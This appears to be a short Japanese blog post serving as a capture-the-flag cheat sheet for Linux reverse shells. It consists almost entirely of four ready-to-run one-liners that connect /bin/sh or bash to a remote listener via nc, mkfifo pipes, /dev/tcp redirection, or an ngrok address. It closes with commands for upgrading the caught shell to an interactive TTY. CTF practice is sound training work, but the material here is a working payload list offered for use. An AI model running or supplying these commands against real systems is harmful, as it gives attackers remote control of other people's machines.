---
layout: post
title: "linux_reverse_shell"
published : true
permalink: /ctf/cheatsheets/common/linux_reverse_shell
tags: [CTF, Common, cheatsheet, linux, reverse shell]
---
## リバースシェル
- コマンド1
```sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.19 7777 >/tmp/f
```
- コマンド2
```sh
bash -i >& /dev/tcp/10.10.14.14/7777 0>&1
```
- コマンド3
```sh
'bash -c "bash -i >& /dev/tcp/10.10.14.4/443 0>&1"'
```
- コマンド4
```sh
nc 0.tcp.jp.ngrok.io:14497 -e /bin/sh
```

## シェルのアップグレード
```
script /dev/null -c bash
```

## シェルをさらにアップグレード
```
(Ctrl + z)
stty raw -echo ; fg
```
